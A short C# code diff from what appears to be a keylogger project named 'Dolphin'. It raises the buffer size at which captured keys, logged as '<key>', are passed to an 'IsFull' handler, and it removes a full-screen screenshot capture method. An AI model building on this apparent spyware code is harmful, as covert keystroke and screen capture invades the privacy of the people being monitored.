@@ -64,7 +64,7 @@ namespace Dolphin
                         {
                             LogsStream.Append($"<{key}>");
                         }
-                        if (LogsStream.Length > 5)
+                        if (LogsStream.Length > 10000)
                         {
                             IsFull?.Invoke(LogsStream);
                             LogsStream.Clear();
@@ -72,20 +72,6 @@ namespace Dolphin
                     }
                 }
             }
-        }
-
-        public Bitmap Screenshot()
-        {
-            Rectangle bounds = Screen.GetBounds(Point.Empty);
-            using var bitmap = new Bitmap(bounds.Width, bounds.Height);
-            using (Graphics g = Graphics.FromImage(bitmap))
-            {
-                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
-            }
-
-            bitmap.Save("test.jpg", ImageFormat.Jpeg);
-            return bitmap;
-            //bitmap.Save("test.jpg", ImageFormat.Jpeg);
         }
     }
 }
